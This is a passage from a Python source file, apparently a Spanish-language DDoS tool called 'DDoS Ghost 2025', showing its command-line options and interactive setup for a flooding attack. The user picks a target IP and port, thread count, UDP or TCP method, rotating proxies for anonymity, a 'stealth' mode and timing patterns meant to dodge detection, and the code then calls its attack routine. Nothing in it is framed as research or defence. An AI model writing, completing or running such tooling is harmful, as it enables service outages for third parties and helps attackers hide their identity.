                print(
                    f"{
                        Colors.GREEN}[+] {
                        len(verified)} proxies verificados de {
                        len(proxy_list_temp)} totales{
                        Colors.ENDC}")

            input("Presiona Enter para continuar...")
            clear_screen()
            show_banner()
        elif choice == '5':
            print(f"{Colors.GREEN}[*] ¡Hasta luego!{Colors.ENDC}")
            sys.exit(0)
        else:
            print(f"{Colors.RED}[!] Opción inválida{Colors.ENDC}")

    # Configurar argumentos con valores por defecto de la configuración
    parser = argparse.ArgumentParser(
        description="DDoS Ghost 2025 - Script avanzado con capacidades anónimas")
    parser.add_argument("-t", "--target", help="Dirección IP objetivo")
    parser.add_argument(
        "-p",
        "--port",
        type=int,
        help="Puerto objetivo (0 para aleatorio)")
    parser.add_argument(
        "-th",
        "--threads",
        type=int,
        default=config['default_threads'],
        help=f"Número de hilos (default: {
            config['default_threads']})")
    parser.add_argument("-m", "--method", choices=["udp", "tcp", "random"], default=config['default_method'],
                        help=f"Método de ataque: udp, tcp, random (default: {config['default_method']})")
    parser.add_argument(
        "-a",
        "--anonymous",
        action="store_true",
        help="Usar modo anónimo con proxies automáticos")
    parser.add_argument(
        "-pf",
        "--proxy-file",
        help="Archivo con lista de proxies")
    parser.add_argument(
        "-v",
        "--verify-proxies",
        action="store_true",
        help="Verificar proxies antes de usar")
    parser.add_argument("-tp", "--timing-pattern", choices=list(TIMING_PATTERNS.keys()), default=config['timing_pattern'],
                        help=f"Patrón de timing (default: {config['timing_pattern']})")
    parser.add_argument(
        "-s",
        "--stealth",
        action="store_true",
        help="Activar modo sigiloso")
    parser.add_argument("-rf", "--rotation-freq", type=int, default=config['proxy_rotation_freq'],
                        help=f"Frecuencia de rotación de proxies (default: {config['proxy_rotation_freq']})")

    args = parser.parse_args()

    if args.target:
        target_ip = args.target
    else:
        target_ip = input(
            f"{Colors.BLUE}[?] Ingresa la IP objetivo: {Colors.ENDC}")

    if not validate_ip(target_ip):
        print(f"{Colors.RED}[!] Error: Dirección IP inválida{Colors.ENDC}")
        sys.exit(1)

    if args.port is not None:
        target_port = args.port
    else:
        port_input = input(
            f"{Colors.BLUE}[?] Ingresa el puerto (1-65535, 0 para aleatorio): {Colors.ENDC}")
        target_port = int(port_input) if port_input.isdigit() else 0

    if target_port != 0 and not validate_port(target_port):
        print(
            f"{Colors.RED}[!] Error: Puerto inválido. Debe estar entre 1-65535{Colors.ENDC}")
        sys.exit(1)

    threads = args.threads
    if threads <= 0:
        print(
            f"{Colors.RED}[!] Error: El número de hilos debe ser mayor que 0{Colors.ENDC}")
        sys.exit(1)

    sock_type = args.method
    timing_pattern = args.timing_pattern
    stealth_mode = args.stealth or config['stealth_mode']
    rotation_freq = args.rotation_freq

    # Configuración de anonimato
    use_proxy = False
    if args.anonymous or args.proxy_file:
        if args.proxy_file:
            use_proxy = setup_proxy_environment(
                proxy_file=args.proxy_file,
                verify_proxies=args.verify_proxies)
        else:
            use_proxy = setup_proxy_environment(
                auto_proxy=True, verify_proxies=args.verify_proxies)

    if not args.anonymous and not args.proxy_file:
        anonymous_input = input(
            f"{Colors.BLUE}[?] ¿Usar modo anónimo con proxies? (s/n): {Colors.ENDC}").lower()
        if anonymous_input == 's':
            use_proxy_file = input(
                f"{Colors.BLUE}[?] ¿Tienes un archivo de proxies? (s/n): {Colors.ENDC}").lower()
            verify_input = input(
                f"{Colors.BLUE}[?] ¿Verificar proxies antes de usar? (s/n): {Colors.ENDC}").lower()
            verify_proxies = verify_input == 's'

            if use_proxy_file == 's':
                proxy_file = input(
                    f"{Colors.BLUE}[?] Ruta al archivo de proxies: {Colors.ENDC}")
                use_proxy = setup_proxy_environment(
                    proxy_file=proxy_file, verify_proxies=verify_proxies)
            else:
                use_proxy = setup_proxy_environment(
                    auto_proxy=True, verify_proxies=verify_proxies)

    # Confirmación con detalles avanzados
    print(f"\n{Colors.YELLOW}[*] Configuración del ataque:{Colors.ENDC}")
    print(
        f"{
            Colors.GREEN}[+] Objetivo: {
            Colors.BOLD}{target_ip}:{
                target_port if target_port != 0 else 'aleatorio'}{
                    Colors.ENDC}")
    print(f"{Colors.GREEN}[+] Método: {Colors.BOLD}{sock_type}{Colors.ENDC}")
    print(f"{Colors.GREEN}[+] Hilos: {Colors.BOLD}{threads}{Colors.ENDC}")
    print(
        f"{Colors.GREEN}[+] Patrón de timing: {Colors.BOLD}{timing_pattern}{Colors.ENDC}")
    print(
        f"{Colors.GREEN}[+] Modo sigiloso: {Colors.BOLD}{('Activado' if stealth_mode else 'Desactivado')}{Colors.ENDC}")
    print(
        f"{Colors.GREEN}[+] Modo anónimo: {Colors.BOLD}{('Activado' if use_proxy else 'Desactivado')}{Colors.ENDC}")
    if use_proxy:
        print(
            f"{Colors.GREEN}[+] Proxies disponibles: {Colors.BOLD}{len(proxy_list)}{Colors.ENDC}")
        print(
            f"{Colors.GREEN}[+] Frecuencia de rotación: {Colors.BOLD}cada {rotation_freq} paquetes{Colors.ENDC}")

    confirm = input(
        f"\n{Colors.YELLOW}[?] ¿Iniciar ataque? (s/n): {Colors.ENDC}").lower()
    if confirm != 's':
        print(f"{Colors.RED}[!] Ataque cancelado{Colors.ENDC}")
        sys.exit(0)

    print(
        f"\n{Colors.GREEN}[*] Iniciando ataque con configuración avanzada...{Colors.ENDC}")
    start_attack(
        target_ip,
        target_port,
        threads,
        sock_type,
        use_proxy,
        timing_pattern,
        stealth_mode,
        rotation_freq)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(
            f"\n{
                Colors.RED}[!] Programa terminado por el usuario{
                Colors.ENDC}")
        sys.exit(0)
